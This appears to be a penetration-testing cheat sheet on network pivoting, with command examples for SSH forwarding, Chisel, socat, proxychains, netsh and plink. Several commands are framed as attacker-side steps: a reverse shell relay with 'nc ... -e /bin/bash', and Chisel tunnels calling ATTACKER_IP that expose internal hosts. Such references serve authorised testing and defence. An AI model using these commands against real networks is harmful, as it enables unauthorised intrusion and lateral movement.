🔗 SSH Local Port Forwarding (-L)

Access remote service through local port.

# Syntax
ssh -L LOCAL_PORT:TARGET_IP:TARGET_PORT user@PIVOT_HOST

# Access internal web server (192.168.1.100:80) via localhost:8080
ssh -L 8080:192.168.1.100:80 user@pivot.host
# Now browse: http://localhost:8080

# Access internal RDP via localhost:3389
ssh -L 3389:192.168.1.100:3389 user@pivot.host
# Now: rdesktop localhost

# Background tunnel
ssh -L 8080:192.168.1.100:80 -N -f user@pivot.host

🌐 SSH Dynamic Port Forwarding (-D) / SOCKS Proxy

Create SOCKS proxy for flexible access to the internal network.

# Create SOCKS proxy on port 9050
ssh -D 9050 -N user@pivot.host

# Background it
ssh -D 9050 -N -f user@pivot.host

# Use with proxychains
proxychains nmap -sT -Pn 192.168.1.0/24
proxychains curl http://internal.host

Proxychains Configuration

# Edit /etc/proxychains4.conf
# Add at bottom:
socks5 127.0.0.1 9050

📤 SSH Remote Port Forwarding (-R)

Expose local service to remote network.

# Expose your web server to pivot network
ssh -R 8080:127.0.0.1:80 user@pivot.host
# Pivot can access your server at localhost:8080

# Expose your listener for reverse shell
ssh -R 4444:127.0.0.1:4444 user@pivot.host
# Target connects to pivot:4444 → reaches your listener

🔧 Chisel

✅ Best for: When SSH isn't available. Works on both Windows and Linux.

Reverse SOCKS Proxy (Most Common)

# On attacker (server)
./chisel server -p 8080 --reverse

# On pivot (client)
./chisel client ATTACKER_IP:8080 R:socks

# Windows pivot
chisel.exe client ATTACKER_IP:8080 R:socks

# Use with proxychains (default port 1080)
# Add to /etc/proxychains4.conf: socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 192.168.1.100

Port Forwarding

# On attacker
./chisel server -p 8080 --reverse

# Forward internal RDP to attacker:3389
./chisel client ATTACKER_IP:8080 R:3389:192.168.1.100:3389

# Multiple forwards
./chisel client ATTACKER_IP:8080 R:3389:192.168.1.100:3389 R:445:192.168.1.100:445

🔌 Socat

Port Forwarding

# Forward local port to remote
socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80

Reverse Shell Relay

# On attacker
nc -lvnp 4444

# On pivot - relay connections to attacker
socat TCP-LISTEN:5555,fork TCP:ATTACKER_IP:4444

# On target - connect to pivot
nc PIVOT_IP 5555 -e /bin/bash

⛓️ Proxychains Usage

# Configuration file: /etc/proxychains4.conf
# Add SOCKS proxy:
socks5 127.0.0.1 1080

# Run tools through proxy
proxychains nmap -sT -Pn 192.168.1.100
proxychains ssh user@192.168.1.100
proxychains curl http://192.168.1.100
proxychains evil-winrm -i 192.168.1.100 -u user -p pass

# Note: Only TCP works! No ICMP/UDP
# Use -sT (TCP connect) not -sS (SYN) for nmap

🪟 Windows Pivoting

Netsh Port Forwarding

:: Add port forward
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.1.100

:: List forwards
netsh interface portproxy show all

:: Remove forward
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0

Plink (PuTTY)

:: Dynamic port forward (SOCKS)
plink.exe -D 9050 -N user@ATTACKER_IP

:: Local port forward
plink.exe -L 8080:192.168.1.100:80 user@ATTACKER_IP

:: Non-interactive
cmd.exe /c echo y | plink.exe -ssh -l user -pw password -R 9050:127.0.0.1:9050 ATTACKER_IP
